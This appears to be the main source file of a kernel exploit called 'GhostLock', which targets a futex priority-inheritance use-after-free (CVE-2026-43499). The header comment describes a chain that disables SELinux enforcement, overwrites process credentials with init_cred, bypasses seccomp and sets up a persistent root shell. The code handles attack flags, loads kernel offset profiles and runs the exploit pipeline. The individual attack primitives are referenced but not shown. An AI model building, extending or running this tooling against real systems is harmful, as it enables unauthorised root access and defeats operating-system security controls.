/*
 * GhostLock — CVE-2026-43499 futex PI UAF exploit
 *
 * W1: SELinux permissive -> W2: cred = init_cred -> W3: seccomp bypass ->
 * independent root shell: ksud late-load + module watch.
 *
 * This translation unit is the thin adapter: parse, run the stage sequence and
 * map the outcome to the process exit code. Setup, attack primitives, victim
 * protocol and stage policy live in their own units under ghostlock::attack,
 * ghostlock::backend::victim, ghostlock::race and ghostlock::session::stages.
 */

#include "common.h"

#include "profile/entry.h"
#include "support/fatal_error.hpp"
#include "support/run_state.hpp"
#include "pipeline/orchestrator.hpp"

#include <array>
#include <memory>
#include <string>
#include <string_view>

using namespace ghostlock;


int main(int argc, char **argv) {
    try {
        profile::kernel_offsets decoded = {};
        std::array<char, 256> release_buf{};
        binary_profile::component_ids ids{
            static_cast<uint16_t>(pipeline::TerminalKind::RootChild),
            static_cast<uint16_t>(pipeline::BackendKind::Cve2026_43499),
            0,
        };

        bool app_call = false;
        bool force_attack = false;
        bool status_record = false;
        const char *prebuilt_path = nullptr;
        const char *dump_dir = nullptr;
        for (int32_t i = 1; i < argc; i++) {
            if (std::string_view(argv[i]) == "--ghostlock-app-call") {
                app_call = true;
            } else if (std::string_view(argv[i]) == "--force-attack") {
                force_attack = true;
            } else if (std::string_view(argv[i]) == "--enable-status-record") {
                status_record = true;
            } else if (std::string_view(argv[i]) == "--load-prebuilt-profile" &&i + 1 < argc) {
                prebuilt_path = argv[++i];
            } else if (std::string_view(argv[i]) == "--dump-kernel-log" && i + 1 < argc) {
                dump_dir = argv[++i];
            } else {
                pr_error("usage: %s [--ghostlock-app-call | --load-prebuilt-profile <bin>]"
                " [--dump-kernel-log <dir>] [--force-attack] [--enable-status-record]\n", argv[0]);
                return 1;
            }
        }
        if (app_call && prebuilt_path) {
            pr_error("choose one entrypoint\n");
            return 1;
        }
        if (status_record && !app_call) {
            pr_error("--enable-status-record requires --ghostlock-app-call\n");
            return 1;
        }
        support::run_state::configure(status_record);

        int32_t loaded;
        if (prebuilt_path != nullptr) {
            loaded = profile_entry::read_glk1_file(prebuilt_path, &decoded, release_buf.data(), release_buf.size(), &ids);
        } else if (app_call) {
            loaded = status_record
                         ? profile_entry::read_glk1_frame_stdin(
                               &decoded, release_buf.data(), release_buf.size(), &ids)
                         : profile_entry::read_glk1_stdin(
                               &decoded, release_buf.data(), release_buf.size(), &ids);
        } else {
            pr_error("no entrypoint: pass --ghostlock-app-call or --load-prebuilt-profile <bin>\n");
            return 1;
        }
        if (loaded != 0) {
            pr_error("cannot load profile\n");
            throw FatalError{};
        }

        auto &session = session::g_exploit_session;
        /* The component selection comes from the wire; the route field is the
         * fallback when a middleware id was not carried. */
        if (ids.middleware == 0) {
            ids.middleware = static_cast<uint16_t>(decoded.route_kind());
        }
        /* Route is backend-internal (ADR-0004 R12): fold the wire selector into
         * the decoded profile the backend switches on. */
        if (decoded.route == profile::kRouteAuto && ids.middleware != 0) {
            decoded.route = static_cast<uint8_t>(ids.middleware);
        }
        const pipeline::ComponentSelection selection{
            static_cast<pipeline::TerminalKind>(ids.terminal),
            static_cast<pipeline::BackendKind>(ids.backend),
        };
        if (!pipeline::selection_supported(selection)) {
            /* Known-but-unavailable ids land here (unknown ids were rejected at
             * decode time), named for diagnosis. */
            const std::string terminal(pipeline::terminal_name(selection.terminal));
            const std::string backend(pipeline::backend_name(selection.backend));
            const std::string route(pipeline::middleware_name(
                static_cast<pipeline::MiddlewareKind>(ids.middleware)));
            pr_error("unsupported component selection: terminal=%s backend=%s route=%s\n",
                     terminal.c_str(), backend.c_str(), route.c_str());
            throw FatalError{};
        }
        /* Batch 4 (D1=B): the orchestrator dispatches the catalogued pipeline
         * directly (backend steps + terminal handoff). DiagnosticStop is a
         * successful early stop (objective already met), not a full run. */
        const pipeline::RunResult result = pipeline::run_orchestrated_pipeline(
            session, selection, decoded, dump_dir, force_attack);
        switch (result.code) {
            case pipeline::RunCode::Rejected:
                pr_error("orchestrator rejected the component selection\n");
                throw FatalError{};
            case pipeline::RunCode::Failed:
                return 1;
            case pipeline::RunCode::Completed:
            case pipeline::RunCode::DiagnosticStop:
                return 0;
        }
        throw FatalError{};
    } catch (const FatalError &) {
        return 1;
    }
}
